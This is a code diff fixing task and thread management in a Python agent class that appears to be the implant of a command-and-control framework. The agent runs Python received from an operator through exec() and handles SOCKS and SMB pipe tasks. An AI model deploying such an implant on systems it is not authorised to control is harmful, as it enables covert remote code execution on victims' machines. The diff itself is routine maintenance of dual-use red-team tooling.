@@ -358,13 +358,17 @@ class MainAgent:
     def agent_exit(self):
         # exit for proper job / thread cleanup
         if len(self.tasks) > 0:
-            try:
-                for x in self.tasks:
-                    self.tasks[x]['task_thread'].kill()
-                    self.tasks[x]['reading_thread'].kill()
-            except:
-                # die hard if thread kill fails
-                pass
+            for x in self.tasks:
+                # kill each task independently so one bad entry (e.g. a task
+                # whose threads never started) can't abort the rest of cleanup
+                for key in ('task_thread', 'reading_thread'):
+                    try:
+                        thread = self.tasks[x][key]
+                        if thread is not None:
+                            thread.kill()
+                    except Exception:
+                        # die hard if thread kill fails
+                        pass
         sys.exit()
 
     def send_job_message_buffer(self):
@@ -552,14 +556,8 @@ class MainAgent:
         """
         self.tasks[result_id]["status"] = "completed"
 
-        filtered_tasks = {
-            task_id: {
-                "status": task_info.get("status", "N/A")
-            } for task_id, task_info in self.tasks.items()
-        }
-
         headers = ["Task ID", "Status"]
-        rows = [[task_id, task_info["status"]] for task_id, task_info in filtered_tasks.items()]
+        rows = [[task_id, task_info.get("status", "N/A")] for task_id, task_info in self.tasks.items()]
         column_widths = [max(len(str(item)) for item in col) for col in zip(*([headers] + rows))]
         separator = ' | '.join('-' * width for width in column_widths)
         header_line = ' | '.join(headers[i].ljust(column_widths[i]) for i in range(len(headers)))
@@ -578,6 +576,13 @@ class MainAgent:
         Task 51
         """
         try:
+            # The tasking packet carries the job id as its wire string, while
+            # self.tasks is keyed by the int result_id unpacked from packets.
+            try:
+                job_to_kill = int(job_to_kill)
+            except (TypeError, ValueError):
+                pass
+
             # Check if the job exists
             if job_to_kill not in self.tasks:
                 available_jobs = ", ".join(str(k) for k in self.tasks.keys())
@@ -586,18 +591,21 @@ class MainAgent:
                         0, "[!] Job %s not found. Available jobs: %s" % (job_to_kill, available_jobs), result_id
                     )
                 )
+                self.tasks[result_id]["status"] = "error"
                 return
 
-            if self.tasks[job_to_kill]['task_thread'].is_alive():
-                self.tasks[job_to_kill]['task_thread'].kill()
+            task_thread = self.tasks[job_to_kill]['task_thread']
+            if task_thread is not None and task_thread.is_alive():
+                task_thread.kill()
                 self.tasks[job_to_kill]['status'] = "stopped"
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
                         51, "[+] Job thread %s stopped successfully" % (job_to_kill), result_id
                     )
                 )
-                if self.tasks[job_to_kill]['reading_thread'].is_alive():
-                    self.tasks[job_to_kill]['reading_thread'].kill()
+                reading_thread = self.tasks[job_to_kill]['reading_thread']
+                if reading_thread is not None and reading_thread.is_alive():
+                    reading_thread.kill()
             else:
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
@@ -605,7 +613,9 @@ class MainAgent:
                     )
                 )
 
-            # Note: STOPJOB tasks are not background jobs, so we don't track them in self.tasks
+            # process_packet tracks every packet (including this STOPJOB) in
+            # self.tasks, so mark it done or it shows "started" forever.
+            self.tasks[result_id]["status"] = "completed"
 
         except Exception as e:
             self.packet_handler.send_message(
@@ -613,7 +623,7 @@ class MainAgent:
                     0, "[!] Error stopping job thread %s: %s" % (job_to_kill, e), result_id
                 )
             )
-            # Note: STOPJOB tasks are not background jobs, so we don't track them in self.tasks
+            self.tasks[result_id]["status"] = "error"
 
     def dynamic_code_execute_wait_nosave(self, data, result_id):
         """
@@ -632,11 +642,13 @@ class MainAgent:
 
         except Exception as e:
             errorData = str(buffer.getvalue())
-            self.packet_handler.build_response_packet(
-                0,
-                "error executing TASK_PYTHON_CMD_WAIT: %s \nBuffer data recovered:\n%s"
-                % (e, errorData),
-                result_id,
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0,
+                    "error executing TASK_PYTHON_CMD_WAIT: %s \nBuffer data recovered:\n%s"
+                    % (e, errorData),
+                    result_id,
+                )
             )
             self.tasks[result_id]["status"] = "error"
 
@@ -690,7 +702,14 @@ class MainAgent:
         Task 112
         """
         output_capture = io.StringIO()
-        script_globals = {'print': lambda *a, **k: print(*a, **k, file=output_capture)}
+        # Job code (e.g. python_jobs_template.py) calls the bare name
+        # job_message_buffer(). The instance attribute of that name is the
+        # buffer string (assigned in __init__, shadowing the method), so bind
+        # the class method explicitly to avoid duplicating its body here.
+        script_globals = {
+            'print': lambda *a, **k: print(*a, **k, file=output_capture),
+            'job_message_buffer': MainAgent.job_message_buffer.__get__(self),
+        }
 
         try:
             exec(data, script_globals)
@@ -725,10 +744,12 @@ class MainAgent:
         # create/process Packet start/return the thread
         # call the job_func so sys data can be captured
         code_thread = KThread(target=self.python_job_func, args=(code, result_id,))
-        code_thread.start()
-
+        # mark running and register the thread BEFORE start(): a fast job can
+        # finish (and write its final status) before post-start lines execute,
+        # which would clobber "completed"/"error" back to "running" forever.
         self.tasks[result_id]['task_thread'] = code_thread
         self.tasks[result_id]["status"] = "running"
+        code_thread.start()
 
     def job_message_buffer(self, message):
         # Supports job messages for checkin
@@ -878,7 +899,8 @@ class MainAgent:
             packet_type = int(packet_type)
             if packet_type == 61:
                 # Avoids tracking temp tasks
-                self.socksqueue.put(base64.b64decode(data.encode("UTF-8")))
+                if self.socksqueue is not None:
+                    self.socksqueue.put(base64.b64decode(data.encode("UTF-8")))
                 return
 
             else:
@@ -925,10 +947,10 @@ class MainAgent:
                 self.change_directory(data, result_id)
 
             elif packet_type == 50:
-                self.job_list(result_id)
+                self.task_list(result_id)
 
             elif packet_type == 51:
-                self.stop_job(data, result_id)
+                self.stop_task(data, result_id)
 
             elif packet_type == 60:
                 self.packet_handler.send_message(
@@ -946,10 +968,6 @@ class MainAgent:
 
             elif packet_type == 70:
                 self.start_smb_pipe_server(data, result_id)
-
-            elif packet_type == 100:
-                self.tasks[result_id]["status"] = "unimplemented"
-                pass
 
             elif packet_type == 100:
                 self.tasks[result_id]["status"] = "unimplemented"
